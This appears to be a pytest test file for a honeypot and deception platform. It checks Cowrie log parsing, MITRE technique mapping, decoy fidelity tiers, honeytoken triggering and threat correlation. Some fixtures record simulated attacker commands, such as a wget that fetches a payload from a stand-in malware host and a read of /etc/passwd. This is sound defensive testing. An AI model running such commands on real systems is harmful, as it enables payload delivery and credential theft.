import json
from datetime import datetime, timedelta
import pytest
from sqlalchemy import create_engine
from sqlalchemy.orm import sessionmaker
from app.core.config import settings
from app.db.session import Base, SessionLocal
from app.models.deception import Honeytoken, DecoySession
from app.models.threat import Threat
from app.models.telemetry import TelemetryEvent
from app.services.cowrie import (
    CowrieParser,
    CowrieService,
    check_cowrie_health,
    generate_simulated_cowrie_log,
)
from app.services.deception import DeceptionEngine
from app.services.threat_intel import ThreatIntel, classify_observed_severity


def test_simulation_mode_generates_cowrie_events_and_deterministic_stats(tmp_path, monkeypatch):
    log_path = tmp_path / "simulated_cowrie.json"
    monkeypatch.setattr(settings, "cowrie_log_path", str(log_path))
    monkeypatch.setattr(settings, "deception_mode", "SIMULATED")

    count = generate_simulated_cowrie_log(str(log_path))
    assert count >= 8

    events = CowrieParser().parse_file(str(log_path))
    assert len(events) >= 8
    assert any(event["event_type"] == "login_failed" for event in events)
    assert any(event["event_type"] == "command_input" for event in events)
    assert any(event["src_ip"] == "198.51.100.45" and event["simulation"] is True for event in events)

    engine = create_engine("sqlite:///:memory:")
    Base.metadata.create_all(engine)
    db = sessionmaker(bind=engine)()
    try:
        ingested = CowrieService().ingest_logs_to_db(db, str(log_path))
        assert ingested >= 4
        records = db.query(DecoySession).filter(DecoySession.mode == "SIMULATED").all()
        assert len(records) >= 4
        fidelities = {record.fidelity for record in records}
        assert fidelities.issubset({"LOW", "MEDIUM", "HIGH"})
        assert {"LOW", "MEDIUM", "HIGH"}.issubset(fidelities)
        assert sum(1 for r in records if r.fidelity == "HIGH") > 0
        assert sum(1 for r in records if r.fidelity == "MEDIUM") > 0
        assert sum(1 for r in records if r.fidelity == "LOW") > 0
    finally:
        db.close()


def test_cowrie_log_parser_and_schema_mapping():
    parser = CowrieParser()
    sample_login = json.dumps({
        "eventid": "cowrie.login.failed",
        "timestamp": "2026-09-28T12:00:00.000000Z",
        "src_ip": "198.51.100.42",
        "session": "a1b2c3d4",
        "username": "root",
        "password": "toor_password",
        "message": "login attempt [root/toor_password] failed",
    })
    sample_cmd = json.dumps({
        "eventid": "cowrie.command.input",
        "timestamp": "2026-09-28T12:00:05.000000Z",
        "src_ip": "198.51.100.42",
        "session": "a1b2c3d4",
        "input": "wget http://malware.site/payload.sh",
        "message": "CMD: wget http://malware.site/payload.sh",
    })

    # Test login event parsing
    p_login = parser.parse_line(sample_login)
    assert p_login is not None
    assert p_login["raw_eventid"] == "cowrie.login.failed"
    assert p_login["src_ip"] == "198.51.100.42"
    assert p_login["username"] == "root"
    assert p_login["password"] == "toor_password"
    assert p_login["session_id"] == "a1b2c3d4"
    assert p_login["mitre_technique"] == "T1110"

    # Test command event parsing
    p_cmd = parser.parse_line(sample_cmd)
    assert p_cmd is not None
    assert p_cmd["raw_eventid"] == "cowrie.command.input"
    assert p_cmd["command"] == "wget http://malware.site/payload.sh"
    assert p_cmd["session_id"] == "a1b2c3d4"
    assert p_cmd["mitre_technique"] == "T1059"

    credential_read = parser.parse_line(json.dumps({
        "eventid": "cowrie.command.input",
        "timestamp": "2026-09-28T12:00:06.000000Z",
        "src_ip": "198.51.100.42",
        "session": "a1b2c3d4",
        "input": "cat /etc/passwd",
    }))
    file_download = parser.parse_line(json.dumps({
        "eventid": "cowrie.session.file_download",
        "timestamp": "2026-09-28T12:00:07.000000Z",
        "src_ip": "198.51.100.42",
        "session": "a1b2c3d4",
        "url": "http://example.invalid/payload",
    }))
    login_success = parser.parse_line(json.dumps({
        "eventid": "cowrie.login.success",
        "timestamp": "2026-09-28T12:00:08.000000Z",
        "src_ip": "198.51.100.42",
        "session": "a1b2c3d4",
        "username": "root",
    }))
    assert credential_read["mitre_technique"] == "T1059"
    assert file_download["mitre_technique"] == "T1105"
    assert login_success["mitre_technique"] == "T1078"


def test_cowrie_observations_are_upserted_and_feed_both_pages(tmp_path, monkeypatch):
    engine = create_engine("sqlite:///:memory:")
    Base.metadata.create_all(engine)
    db = sessionmaker(bind=engine)()
    log_path = tmp_path / "cowrie.json"
    events = [
        {
            "eventid": "cowrie.session.connect",
            "timestamp": "2026-09-30T09:15:00.000000Z",
            "session": "real-session-1",
            "src_ip": "198.51.100.25",
            "dst_ip": "127.0.0.1",
            "dst_port": 2222,
            "protocol": "ssh",
        },
        {
            "eventid": "cowrie.login.failed",
            "timestamp": "2026-09-30T09:15:02.000000Z",
            "session": "real-session-1",
            "src_ip": "198.51.100.25",
            "username": "operator",
            "password": "test-capture-only",
        },
        {
            "eventid": "cowrie.command.input",
            "timestamp": "2026-09-30T09:15:04.000000Z",
            "session": "real-session-1",
            "src_ip": "198.51.100.25",
            "input": "uname -a",
            },
    ]
    log_path.write_text("\n".join(json.dumps(event) for event in events), encoding="utf-8")
    cowrie = CowrieService()

    assert cowrie.ingest_logs_to_db(db, str(log_path)) == 1
    assert cowrie.ingest_logs_to_db(db, str(log_path)) == 1
    records = db.query(DecoySession).filter(DecoySession.mode == "COWRIE").all()
    assert len(records) == 1
    record = records[0]
    assert record.source_ip == "198.51.100.25"
    assert record.actor == "operator"
    assert record.timestamp.isoformat().startswith("2026-09-30T09:15:00")
    assert record.confidence is None
    observed = json.loads(record.activity)
    assert observed[0]["protocol"] == "ssh"
    assert observed[0]["dst_ip"] == "127.0.0.1"
    assert observed[0]["dst_port"] == 2222
    assert observed[2]["request"] == "uname -a"

    db.add(DecoySession(
        decoy_type="ssh",
        mode="SIMULATED",
        source_ip="203.0.113.99",
        activity=json.dumps(["not a Cowrie event"]),
    ))
    db.commit()
    deception_rows = DeceptionEngine(db).list_sessions()
    assert len(deception_rows) == 2

    db.add(Threat(
        actor_name="Seeded Example Actor",
        username="seeded-user",
        ip_address="203.0.113.42",
        risk_score=99.0,
        severity="critical",
        techniques=json.dumps(["T1110"]),
        commands=json.dumps(["fabricated command"]),
        description="Seeded demonstration row",
    ))
    db.commit()
    profiles = ThreatIntel(db).list_threats()
    assert len(profiles) == 1
    profile = profiles[0]
    assert profile["ip_address"] == "198.51.100.25"
    assert profile["event_count"] == 3
    assert profile["session_count"] == 1
    assert profile["first_seen"] == "2026-09-30T09:15:00.000000Z"
    assert profile["last_seen"] == "2026-09-30T09:15:04.000000Z"
    assert profile["duration_seconds"] == 4.0
    assert profile["severity"]["label"] == "Active probing"
    assert {item["technique_id"] for item in profile["technique_evidence"]} == {"T1110", "T1059"}
    assert any(item["request"] == "uname -a" for item in profile["technique_evidence"])
    assert profile["external_intelligence"] == {"status": "not_available", "provider": None}
    assert "risk_score" not in profile
    assert profile["severity"]["label"] == "Active probing"
    assert "uname -a" in profile["severity"]["reason"]
    assert profile["commands"] == ["uname -a"]

    from app.api.deception import list_sessions
    from app.api.threats import list_threats, threat_detail
    from app.services.cowrie import cowrie_service

    later_event = {
        "eventid": "cowrie.command.input",
        "timestamp": "2026-09-30T09:15:06.000000Z",
        "session": "real-session-1",
        "src_ip": "198.51.100.25",
        "input": "id",
    }
    with log_path.open("a", encoding="utf-8") as log_file:
        log_file.write("\n" + json.dumps(later_event))
    monkeypatch.setattr(
        cowrie_service,
        "ingest_logs_to_db",
        lambda target_db: cowrie.ingest_logs_to_db(target_db, str(log_path)),
    )
    deception_response = list_sessions(db=db, _=None)
    threat_response = list_threats(db=db, _=None)
    detail_response = threat_detail(threat_id=record.id, db=db, _=None)
    assert len(deception_response) == 1
    assert deception_response[0]["mode"] == "COWRIE"
    assert deception_response[0]["activity"][3]["request"] == "id"
    assert threat_response[0]["event_source"] == "Cowrie honeypot"
    assert threat_response[0]["event_count"] == 4
    assert threat_response[0]["last_seen"] == later_event["timestamp"]
    assert detail_response["external_intelligence"]["status"] == "not_available"
    assert {
        "ip_address", "observations", "commands", "techniques", "technique_evidence",
        "protocols", "source_ports", "ports", "first_seen", "last_seen",
    }.issubset(detail_response)
    db.close()


def test_threat_correlation_uses_only_observed_identity_and_commands():
    engine = create_engine("sqlite:///:memory:")
    Base.metadata.create_all(engine)
    db = sessionmaker(bind=engine)()
    event = TelemetryEvent(
        user_id="observed-user",
        ip_address="198.51.100.77",
        event_type="powershell",
        location="",
        risk_indicators=json.dumps([]),
        raw=json.dumps({"raw_payload": {"target": "endpoint"}}),
    )

    correlated = ThreatIntel(db).correlate(event, risk_score=82.0, decision="deny")

    assert correlated is not None
    assert correlated.actor_name == "198.51.100.77"
    assert json.loads(correlated.commands) == []
    second_event = TelemetryEvent(
        user_id="second-observed-user",
        ip_address="198.51.100.77",
        event_type="ssh_attempt",
        location="",
        risk_indicators=json.dumps([]),
        raw=json.dumps({}),
    )
    same_source = ThreatIntel(db).correlate(second_event, risk_score=75.0, decision="deny")
    assert same_source is not None
    assert same_source.id == correlated.id
    db.close()


def test_cowrie_parser_does_not_invent_missing_evidence():
    parsed = CowrieParser.parse_line(json.dumps({"eventid": "cowrie.login.failed"}))
    assert parsed is None


def test_cowrie_truthful_health_check():
    health = check_cowrie_health()
    assert "status" in health
    assert health["status"] in ("HEALTHY", "UNAVAILABLE", "DEGRADED")
    assert "mode" in health


def test_adaptive_decoy_selection_logic():
    db = SessionLocal()
    try:
        engine = DeceptionEngine(db)
        # 1. High risk + Brute Force / Credential Access -> HIGH fidelity fake terminal / SSH honeypot
        d1 = engine.select_adaptive_decoy(
            risk_score=85,
            mitre_technique="T1110",
            event_type="failed_login",
        )
        assert d1.fidelity == "HIGH"
        assert d1.decoy_type in ("ssh_honeypot", "fake_terminal", "bastion_host", "ssh", "admin_panel")
        assert d1.confidence >= 0.85

        # 2. Medium risk -> MEDIUM fidelity
        d2 = engine.select_adaptive_decoy(
            risk_score=65,
            mitre_technique=None,
            event_type="file_access",
        )
        assert d2.fidelity == "MEDIUM"

        # 3. Low risk -> LOW fidelity
        d3 = engine.select_adaptive_decoy(
            risk_score=20,
            mitre_technique=None,
            event_type="routine_read",
        )
        assert d3.fidelity == "LOW"
    finally:
        db.close()


def test_multi_tier_fidelity_attributes():
    db = SessionLocal()
    try:
        engine = DeceptionEngine(db)
        s_low = engine.open_decoy(actor="test_low", source_ip="10.0.0.1", threat_id=None, risk_score=20)
        s_med = engine.open_decoy(actor="test_med", source_ip="10.0.0.2", threat_id=None, risk_score=65)
        s_high = engine.open_decoy(actor="test_high", source_ip="10.0.0.3", threat_id=None, risk_score=90, mitre_technique="T1110")

        assert s_low.fidelity == "LOW"
        assert s_med.fidelity == "MEDIUM"
        assert s_high.fidelity == "HIGH"

        status = engine.fidelity_status()
        assert status["high_fidelity_count"] >= 1
        assert status["medium_fidelity_count"] >= 1
        assert status["low_fidelity_count"] >= 1
    finally:
        db.close()


def test_honeytoken_trigger_lifecycle():
    db = SessionLocal()
    try:
        engine = DeceptionEngine(db)
        # Create a test honeytoken
        token = Honeytoken(
            label="AWS_SECRET_KEY_PROD",
            token_type="api_key",
            planted_on="/root/.aws/credentials",
            value="AKIA_TEST_CANARY_STRING_XYZ",
            triggered=0,
        )
        db.add(token)
        db.commit()
        db.refresh(token)

        # Trigger honeytoken lifecycle
        res = engine.trigger_honeytoken_lifecycle(
            token_id_or_value=token.id,
            actor="attacker_eve",
            source_ip="203.0.113.88",
        )

        assert res is not None
        assert res["token"]["label"] == "AWS_SECRET_KEY_PROD"
        assert "CRITICAL" in res["alert"]
        assert res["escalated_risk"] == 95.0
        assert res["decoy_session_id"] is not None

        # Verify DB states
        db.refresh(token)
        assert token.triggered == 1
        assert token.triggered_by == "attacker_eve"

        # Verify Decoy session created
        decoy = db.query(DecoySession).filter(DecoySession.id == res["decoy_session_id"]).first()
        assert decoy is not None
        assert decoy.fidelity == "HIGH"
        assert decoy.actor == "attacker_eve"
    finally:
        db.close()


def test_observed_severity_classification_rules():
    recon = classify_observed_severity([
        {"event_type": "connect", "request": "Connection observed"},
        {"event_type": "login_failed", "request": "login failed"},
    ])
    active = classify_observed_severity([
        {"event_type": "command_input", "request": "whoami"},
    ])
    elevated = classify_observed_severity([
        {"event_type": "command_input", "request": "cat /etc/passwd"},
    ])

    assert recon["label"] == "Reconnaissance only"
    assert active["label"] == "Active probing"
    assert elevated["label"] == "Elevated activity"
    assert "Credential file read" in elevated["reason"]


def test_threat_profiles_derive_timeline_technique_evidence_and_correlations(monkeypatch):
    engine = create_engine("sqlite:///:memory:")
    Base.metadata.create_all(engine)
    db = sessionmaker(bind=engine)()

    def add_session(source_ip, session_id, protocol, port, first_seen):
        first = datetime.fromisoformat(first_seen.replace("Z", "+00:00"))
        activity = [
            {
                "timestamp": first_seen,
                "event_id": "cowrie.session.connect",
                "event_type": "connect",
                "src_ip": source_ip,
                "src_port": 50000,
                "protocol": protocol,
                "dst_ip": "127.0.0.1",
                "dst_port": port,
                "request": "connection observed",
                "mitre_technique": None,
            },
            {
                "timestamp": (first + timedelta(seconds=4)).isoformat().replace("+00:00", "Z"),
                "event_id": "cowrie.command.input",
                "event_type": "command_input",
                "src_ip": source_ip,
                "src_port": None,
                "protocol": None,
                "dst_ip": None,
                "dst_port": None,
                "request": "uname -a",
                "mitre_technique": "T1059",
            },
        ]
        db.add(DecoySession(
            mode="COWRIE",
            decoy_type=protocol,
            source_ip=source_ip,
            actor="root",
            timestamp=first,
            activity=json.dumps(activity),
            notes=f"Cowrie session ID: {session_id}",
        ))

    from app.services.cowrie import cowrie_service

    monkeypatch.setattr(cowrie_service, "ingest_logs_to_db", lambda target_db: 0)
    add_session("198.51.100.31", "return-1", "ssh", 2222, "2026-09-30T10:00:00.000000Z")
    add_session("198.51.100.31", "return-2", "mysql", 3306, "2026-09-30T10:05:00.000000Z")
    add_session("198.51.100.32", "other-1", "ssh", 2222, "2026-09-30T10:01:00.000000Z")
    db.commit()

    profiles = ThreatIntel(db).list_threats()
    returning = next(profile for profile in profiles if profile["ip_address"] == "198.51.100.31")
    related = returning["related_activity"]

    assert returning["session_count"] == 2
    assert returning["return_activity"] is True
    assert returning["duration_seconds"] == 304.0
    assert {session["protocols"][0] for session in returning["sessions"]} == {"ssh", "mysql"}
    assert returning["technique_evidence"][0]["technique_id"] == "T1059"
    assert returning["technique_evidence"][0]["request"] == "uname -a"
    assert any(item["kind"] == "same_source_ip_sessions" for item in related)
    assert any(item["kind"] == "shared_command_pattern" for item in related)
    assert any(item["kind"] == "shared_technique" for item in related)
    assert any(item["kind"] == "shared_protocol_port" for item in related)
    assert returning["external_intelligence"] == {"status": "not_available", "provider": None}
    db.close()


def test_fidelity_rules_cover_all_three_levels():
    """Verify that both CowrieService and DeceptionEngine deterministically produce
    all three fidelity levels (LOW, MEDIUM, HIGH) according to their explainable criteria.
    """
    # 1. Test CowrieService._infer_fidelity
    # LOW: First contact or port probe without auth/commands
    low_events = [{"raw_eventid": "cowrie.session.connect", "src_ip": "1.2.3.4"}]
    assert CowrieService._infer_fidelity(low_events) == "LOW"

    # MEDIUM: Login attempt or reconnaissance
    med_events = [{"raw_eventid": "cowrie.login.failed", "username": "admin", "password": "123"}]
    assert CowrieService._infer_fidelity(med_events) == "MEDIUM"

    # HIGH: Interactive session with commands recorded or file download
    high_events = [
        {"raw_eventid": "cowrie.session.connect", "src_ip": "1.2.3.4"},
        {"raw_eventid": "cowrie.command.input", "command": "uname -a", "input": "uname -a"},
        {"raw_eventid": "cowrie.command.input", "command": "whoami", "input": "whoami"},
    ]
    assert CowrieService._infer_fidelity(high_events) == "HIGH"

    # 2. Test DeceptionEngine.select_decoy_and_fidelity
    engine = create_engine("sqlite:///:memory:")
    Base.metadata.create_all(engine)
    db = sessionmaker(bind=engine)()
    try:
        deception = DeceptionEngine(db)

        # LOW fidelity: low risk score, generic probe
        dec_low = deception.select_adaptive_decoy(
            risk_score=25.0,
            event_type="network_request",
            device_trust=95.0,
        )
        assert dec_low.fidelity_level == "LOW"

        # MEDIUM fidelity: moderate elevated risk (e.g. failed login, risk 50)
        dec_med = deception.select_adaptive_decoy(
            risk_score=50.0,
            event_type="failed_login",
            history_failures=1,
            device_trust=55.0,
        )
        assert dec_med.fidelity_level == "MEDIUM"

        # HIGH fidelity: high risk posture or critical attack event (privilege escalation, risk 80)
        dec_high = deception.select_adaptive_decoy(
            risk_score=80.0,
            event_type="privilege_escalation",
            mitre_technique="T1059",
            device_trust=20.0,
        )
        assert dec_high.fidelity_level == "HIGH"
    finally:
        db.close()
